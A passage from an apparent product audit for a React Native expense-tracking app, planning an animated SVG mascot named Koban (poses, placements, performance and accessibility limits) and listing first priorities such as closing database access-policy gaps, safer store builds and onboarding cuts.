      <Animated.View style={[abs, { transformOrigin: '50% 100%' }, bodyStyle]}><Body fill={colors.kobanBody} rim={surface === 'dark' ? colors.kobanRim : null} /></Animated.View>
      {/* Head, ears, eyes (lidProps), paw (pawStyle) composed the same way. 'head' variant renders head/ears/eyes only. */}
    </Wrapper>
  );
}
```

Notes on the sketch:

- **Mood maps to a pose table**, not branches. A `MOODS` object holds lid level, brow angle, pupil size, paw state, ear angle and loop set.
- **One `onPress` reaction:** an ear flick plus a blink. Add `Haptics.selectionAsync()` only on a tappable full-screen Koban.
- **New theme tokens:** `kobanBody` and `kobanRim` go in `theme/themes.js` per mode, never hardcoded (AGENTS.md theming rule). Dark mode turns the rim on automatically.
- **Pause when off-screen:**
  - `useIsFocused()` stops loops when the user navigates away.
  - Add an `AppState` listener (or read `useIsFocused` alongside it) so loops stop when the app is backgrounded.
  - For Koban inside a scroll view, accept a `visible` prop driven by the parent's `onViewableItemsChanged`. The default is `loop='once'`, so most instances settle by themselves.
- **Reduced motion:** Reanimated `useReducedMotion()` turns off loops, translation and scale. The static pose for the mood still renders, so the state still reads. Also pass `ReduceMotion.System` on each animation. The app's existing hand-rolled `AccessibilityInfo` checks in `Confetti.js`/`FadeIn.js` can move to this hook later.

### 3. Where and what

**Cap (a standing rule to add to `00-index.md`):**

- At most **one Koban per screen**.
- **None on dense data screens** (populated Home, Transactions, Analytics, Budgets/Plans/Bills lists, Report).
- **Idle loops only on full-screen, rare moments.**
- Frequent surfaces (seen daily) get a **static pose, or one blink on mount** (expo-animation frequency gate).
- Never displace an earned badge, the lit flame, the brand mark or tour screenshots (IDEAS do-NOT list).

| Screen / moment | What Koban does | Loop | Priority |
|---|---|---|---|
| **Onboarding opener** (`intro/opener.js`) | `beckon`. The paw beckons 3 times on mount (the maneki-neko gesture), then idle blink and breathe. The first impression, and the single best place to show he is alive | idle (full-screen, seen once) | **P0** |
| **First expense logged** (StreakCelebration day 1, `isNewStreak` only) | `celebrate`. Jumps in (scale 0.95 to 1 + fade), paw up, eyes squint happy, then settles. Replaces the orange flame cat with the rig on `surface="dark"` (rim on). Milestone days keep their badge art | once | **P0** |
| **Streak milestones** (day 3+) | **Nothing.** The earned badge is the reward (do-NOT list) | none | n/a |
| **Daily TodayCard** (44 px `IconTile`) | `variant="head"`. `open` state uses the `idle` head (one blink on mount); `nospend` uses the `proud` head (eyes closed-happy). Static otherwise, because it is a daily surface | once (single blink) | **P1** |
| **Evening reminder landing** (push opens the app at TodayCard) | Same TodayCard head. On arrival from the reminder deep link, one ear flick and a look up toward the CTA. No extra UI | once | P2 |
| **Empty states (genuinely zero data only)**: Home Recent, Transactions (first-ever, not a browsed month), Budgets, Bills, Plans lists, as `<KobanEmpty>` | `beckon` (Home, Transactions) or `idle` at about 96 px, plus title, body and CTA. Gate on account-level zero, never on an empty filter or period | once | **P1** (Home + Transactions), P2 (others) |
| **Streak zero state** (`app/streak.js`, `!lit`) | `sleepy` (lids half closed) in place of the unlit flame, plus a line of copy. Never replace the lit flame | once | P2 |
| **Budget nearing its limit** | `concerned` head (brows up, ears slightly back) **only in the alert row/notice** (AlertsSheet or budget-detail banner), with factual copy ("₹800 left for 6 days"). Never on the budgets list, never red, no shaming | none | P2 |
| **Loading / pull-to-refresh** | **No Koban.** Loading is high-frequency. Keep `RefreshControl` and the existing `Skeleton` | none | do not |
| **Error / offline** | The app has no offline/error screen today (no NetInfo, no ErrorBoundary). If one is built, a `concerned` Koban fits there (full-screen, rare). Not a reason to build one | once | P3 |
| **Onboarding done / welcome bundle** | `celebrate` once, replacing `you-are-set.png`/`welcome-bundle.png` when the rig has props | once | P2 |
| **Other onboarding question screens** | Keep the current PNG poses (they carry props: clipboard, magnifier) until prop layers exist. Subtle `once` breathing only if moved to the rig | none to once | P3 |
| **Push notification large icon** | Skip. The Expo push service does not expose Android `largeIcon`; it would need direct FCM or a native module. The small silhouette icon already covers branding | n/a | P3 / do not |
| **App icon** | Already Koban. Keep it; make it the model-sheet reference so the rig matches it | n/a | (reference) |
| **Splash** | Keep the ArrowMark (brand mark, not mascot; Android 12+ splash is static anyway). Optionally hand off from the splash to an animated Koban on the opener only | n/a | P3 |
| **Pro / paywall** | Undecided in the IDEAS doc. Recommend **no**: a mascot selling an upgrade is the wrong register | n/a | do not |

### 4. Performance and accessibility

- **Frame budget:**
  - Target 16.6 ms at 60 Hz on low-end Android (Snapdragon 4-series / Helio G-class, 3–4 GB RAM) and 8 ms where 120 Hz is active.
  - Koban should use under 1 ms of UI-thread time per frame. That is achievable when about 6 Animated.Views animate only `transform`/`opacity`.
  - Never animate `width`/`height`/`elevation`.
  - Blink via `useAnimatedProps` is acceptable because it runs about 8 frames every 4–7 s.
- **UI thread only:**
  - No `setState` in loops.
  - No `scheduleOnRN` per frame.
  - Re-arm the blink with a JS `setTimeout`, not a per-frame callback.
  - Shared values only via `.get()`/`.set()` in worklets and effects.
- **Battery:**
  - Infinite loops only with `loop="idle"`, which is allowed only on full-screen rare moments.
  - Everything stops on blur (`useIsFocused`), on background (`AppState`) and when scrolled off-screen (`visible` prop).
  - `once` loops settle after 2 cycles (about 4 s).
- **Reduced motion:** `useReducedMotion()` keeps the static pose for the mood. No loops, no scale or translate. Opacity entrances may stay, short.
- **Accessibility:**
  - Decorative by default: `accessibilityElementsHidden` + `importantForAccessibility="no-hide-descendants"`. The adjacent copy already carries the meaning.
  - Give a `label` only when Koban is tappable or is the only carrier of meaning (for example "Koban, celebrating your first day").
  - Tappable Koban: 48 dp target via `hitSlop`.
- **Verify on a release build** on the slowest Android available, not Expo Go (expo-animation hard rule 5).

---

### Prioritized findings

#### [P0] Koban is a flat raster silhouette with no rig, so he cannot animate and looks like clip art
**Problem:**
- All 17 mascot images are flattened 1024² PNGs with a single `#101010` body fill.
- Limbs over the torso vanish (`budget.png`, `money-leak.png`).
- Nothing moves except one `ZoomIn`.
- This is the root of "looks too simple."

**Change:**
- Commission or draw one vector model sheet based on the app-icon head, split into the named layers above (body with a secondary tone, head, ears L/R, eyes, lids, pupils, tail, paws, rim).
- Build `components/koban/Koban.js` on react-native-svg + Reanimated 4 using the View-per-part rig.
- The API is `mood`, `size`, `variant`, `surface`, `loop`, `label`, `onPress`.
- Add no new native dependency.

**Priority rationale:** Every other mascot improvement depends on this asset and component, and it is the owner's direct complaint.

#### [P0] Use the SVG + Reanimated approach; do not add Lottie, Rive or Skia now
**Problem:**
- The owner left the approach open.
- The wrong choice adds a native dependency to an app that already feels bloated.
- Version pins are traps on SDK 54:
  - lottie 7.5 needs RN 0.84;
  - Skia 2.14 needs worklets 0.7;
  - Rive's new package is pre-1.0 and Nitro-based.

**Change:**
- Adopt approach (a).
- Record the decision in `05-koban-engagement.md` (a Phase 5+ entry) and in `00-index.md`.
- Revisit Rive only if an interactive state machine becomes a real requirement.
- If Lottie is ever added for a one-off scene, install it via `npx expo install` (it resolves to `~7.3.1`).

**Priority rationale:** This decision has to be made before more placements harden around PNGs. The IDEAS doc's open question says the same.

#### [P0] Day-1 StreakCelebration and the onboarding opener are the two showcase moments
**Problem:**
- The two moments where an alive Koban pays off most are static today.
- Day 1 uses an orange flame cat that is off-model and side-steps the black-on-`#101010` problem instead of solving it.

**Change:**
- Opener: `<Koban mood="beckon" loop="idle" />`.
- StreakCelebration, `isNewStreak` only: `<Koban mood="celebrate" surface="dark" loop="once" />` with the rim stroke.
- Milestone days keep their badge art.

**Priority rationale:** These are rare, full-screen and first-impression moments, which is the delight tier where the motion budget belongs.

#### [P1] One character: the app icon, onboarding poses and flame cat are three different drawings
**Problem:**
- Eye construction, palette and shadow colour vary between assets.
- `streak.png` is orange.
- The mascot does not read as one character across the app.

**Change:**
- Make the vector model sheet the canon.
- Re-derive the onboarding poses from it as rig moods or prop poses over time.
- Keep the flame Koban only as the streak-badge artwork in the Trophy/streak grids, where it is "Koban powered up," or redraw it on-model.

**Priority rationale:** Consistency matters more than adding poses, but the work can follow the rig.

#### [P1] TodayCard head and KobanEmpty (Home, Transactions) are the high-value everyday placements
**Problem:**
- `TodayCard` shows a generic `Wallet`/`CircleCheck` glyph.
- The Home and Transactions empty states are a bare 14 px line of text.

**Change:**
- TodayCard: `<Koban variant="head" size={44} mood={state==='nospend'?'proud':'idle'} loop="once" />` with one blink on mount and no loop (daily surface).
- Build `<KobanEmpty>` and gate it on genuinely-zero account data, never on an empty period or filter.

**Priority rationale:** These have the most reach for the least risk, and each replaces existing chrome rather than adding any.

#### [P1] Mascot PNG weight: 3.7 MB of mostly-transparent padding plus an unused backup
**Problem:**
- The 17 PNGs total 3.7 MB, and about half of each canvas is empty.
- `hey_screen_bu.png` (275 KB) is unreferenced.
- `*_backup.png` siblings sit in `assets/`.

**Change:**
- Crop to the alpha bounding box and re-export as WebP at roughly 3x display size (about 630 px). Expect a reduction of around 70–80%.
- Delete the unreferenced backup after confirming no `require()` uses it.
- As poses move to the rig, delete their PNGs.

**Priority rationale:** This is a cheap win against "bloat" and also fixes the "renders smaller than its box" sizing problem.

#### [P2] Concerned Koban for a budget nearing its limit, confined to the alert
**Problem:** There is no warm, non-shaming signal when a budget is close to its limit.

**Change:**
- Show a `concerned` head (static) only in the AlertsSheet or budget-detail notice row, with factual remaining-amount copy.
- Never on the budgets list. Never red or scolding (koban.js voice rule: never shame spending).

**Priority rationale:** Useful, but it is a new message surface that needs copy review, and it sits next to dense data.

#### [P2] Streak zero state, evening-reminder landing, done/welcome screens
**Problem:**
- The zero streak conveys its state by colour alone.
- The reminder deep-link lands with no acknowledgement.
- The done and welcome PNGs are static.

**Change:**
- Zero streak: `sleepy` Koban in place of the unlit flame, plus copy.
- Reminder landing: an ear flick and look-up on the TodayCard head when arriving from the reminder.
- Done and welcome: `celebrate` once.

**Priority rationale:** Each is small and builds on the P0/P1 component.

#### [P2] Restore Koban's personified voice in `lib/koban.js`
**Problem:** The copy was deliberately stripped of "Koban" because art didn't exist (the file comment says so). Art now exists.

**Change:**
- Restore the 05 Phase 3 intended lines (for example "Koban's paw goes up").
- Keep `lib/reminderCopy.js` and `supabase/functions/send-push/reminderCopy.ts` in sync if notification copy changes.

**Priority rationale:** It needs no art, but it pairs best with the animated face landing.

#### [P3] Placement guardrails as a standing rule
**Problem:** Without a written cap, mascot use will drift into decoration, which the owner explicitly does not want.

**Change:** Add to `00-index.md` standing rules:
- one Koban per screen;
- none on populated data screens;
- idle loops only on full-screen rare moments;
- static or a single blink on daily surfaces;
- no Koban on loading, Pro/paywall, sign-in, tour, milestone badges or the lit flame.

**Priority rationale:** It is cheap and prevents regression, but it only matters once the component exists.

#### [P3] Skip notification large icon and animated splash; error/offline Koban only if such a screen is built
**Problem:** These were listed as candidates, but each costs more than it returns:
- the Expo push API has no `largeIcon`;
- Android 12+ splash is a static icon;
- no offline or error screen exists.

**Change:** Leave the splash as the ArrowMark and keep the small notification silhouette. If an offline or ErrorBoundary screen is ever built, use `concerned` Koban there.

**Priority rationale:** These are low reach, and some would need native work.

---

## 8. Top changes to make first

In order. Items 1–2 are safety, 3–6 are the product reset, and 7–8 are launch plumbing that has long lead times, so start them in parallel.

1. **Close the two live security holes now.**
   - Lock `split_members` updates (a member can make themselves organizer or move into another split).
   - Add ownership checks to the INSERT/UPDATE policies on transactions, plans, budgets and split shares.

   SQL is in §3. These policies are live today.
2. **Make the store build safe by default.**
   - Flip `app.config.js` so auto-detect is opt-in (`FLO_VARIANT === 'personal'`) and make `production` the lite build.
   - Delete `submit.full`.
   - Check the built AAB's manifest for no `NotificationListenerService` before every upload.
   - Delete the still-ACTIVE `ai-interpret` and `ai-report-summary` functions and their API keys.
3. **Instrument (PostHog or an `events` table)** before the cuts land, so the reset is measurable.
4. **Cut onboarding to 4 screens and make logging 3 taps.**
   - Onboarding: opener → Google → first expense in the real Add sheet → reminder opt-in.
   - Add sheet: smart default category, a top-8 grid and a pinned Save.
5. **Strip the game layer to a streak plus auto-earned freezes.**
   - Turn off coins, XP/ranks, trophies, the spin wheel, the shop and coin packs, card themes, Personalize and the welcome bundle (feature flags; keep the code).
   - Theming becomes one brand accent with System/Light/Dark.
   - Hide all Pro prices and Buy buttons for v1.0.
   - Hide Plans and split invites for v1.
6. **Home money-first, a single moment queue, and one adaptive evening nudge plus a Monday recap.** These replace the twice-daily pushes and the stacked celebrations.
7. **Launch identity and compliance (long lead time).**
   - Choose the permanent package id (re-register Firebase/FCM).
   - Set the EAS env vars for Supabase (otherwise the cloud build crashes at boot).
   - Publish the privacy-policy and account-deletion web pages.
   - Fix "Forgot password" (custom SMTP).
   - Add Sentry or expo-observe and a root error boundary.
   - **Start the 12-tester, 14-day closed test as soon as a lite AAB exists.**
8. **Accessibility baseline in shared components.**
   - One `IconButton`/`BackButton`: 48 dp, a required label and a pressed state.
   - Muted text at ≥4.5:1.
   - Lime only as a fill.
9. **Mascot:** commission one layered vector Koban (from the app-icon head) and build `<Koban mood size surface loop />` on react-native-svg + Reanimated 4, with no new native dependency. Ship it on the onboarding opener and the day-1 streak moment first.
